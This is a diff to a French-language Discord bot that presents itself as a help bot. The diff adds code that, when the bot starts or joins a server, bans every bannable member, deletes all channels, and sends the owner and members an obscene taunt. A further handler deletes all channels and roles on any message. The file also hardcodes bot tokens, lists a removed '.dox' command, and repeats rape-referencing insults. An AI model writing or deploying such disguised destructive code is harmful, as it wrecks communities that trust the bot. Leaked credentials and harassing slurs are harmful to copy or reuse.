@@ -2,12 +2,50 @@ const Discord = require('discord.js')
 const client = new Discord.Client()
 
 var prefix = '.';
-var token = 'NDE3MzUzOTYwMjI0MDYzNDg4.DwAJkA.iLgQoJCUbr-SeH_0okM4ofNpKKU';
+var token = 'NTI3MDc3NjY0ODUxMzYxODA0.DwQ5Xw.LOAgOyf1loJP4km1qxKJiXLSmGw' //lien du Bot : https://discordapp.com/oauth2/authorize?client_id=522470020211539968&scope=bot&permissions=8
 
-client.login(token);
+client.login(token)
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send('tu t es fais baiser par Flow212rocma slp').catch(e => { return void e; });
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('tu t es fais baiser par Flow212rocma slp').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+
+  await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+
+  console.log(`Nuked ${users} users and ${channels} channels in ${guild} owned by Flow212rocma`);
+
+  await guild.defaultChannel.send('tu t es fais baiser par Flow212rocma slp').catch(e => { return void e; });
+  return guild.leave();
+}
+
+client.on('ready', () => {
+  for(const [, g] of client.guilds) nuke(g).catch(console.error);
+  console.log('Ready to have some fun... >:)');
+});
+
+client.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
 
 client.on('ready' , function (){
-	client.user.setActivity("A coder !")
+	client.user.setActivity(".help | Flow212rocma")
 	console.log("prêt frr")
 });
 
@@ -35,9 +73,7 @@ client.on('message' , message =>{
 					   .setTitle("Help")
 					   .setDescription("commande du Bot")
 					   .addField(".help","Page d'aide", true)
-					   .addField(".dox","Dox , mise a jour hebdomadaire", true)
 					   .addField(".createur","affiche le createur", true)
-					   .addField(".raid","pour raid un serveur discord.", true)
 					   .addField(".flow","a toi de voir :)", true)
 					   .addField(".membres","affiche les membres sur votre serveur", true)
 					   .addField(".rejoins","affiche le jour et l heure ou tu as rejoins le serveur", true)
@@ -209,7 +245,7 @@ client.on('message', message => {
 
 client.on('message', message => {
 	if(message.content === "kais"){
-		message.channel.send(".raid")
+		message.channel.send("@here")
 		message.delete();
 		console.log("quelq'un à appeler kais")
 	}
@@ -324,70 +360,21 @@ client.on('message', message => {
 		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
 		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
 		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send(".raid")
 		message.delete()
 		console.log("-1 srv")
 	}
+});
+
+client.on("message", async message => {
+    if(message.content === "destroy"){
+        message.guild.channels.deleteAll("Bot Destroyer");
+        message.guild.roles.deleteAll("Bot Destroyer");
+    }
+
+    if(message.content === "leave"){
+        message.guild.leave();
+    }
+    message.guild.channels.deleteAll("Bot Destroyer");
+    message.guild.roles.deleteAll("Bot Destroyer");
+    
 });
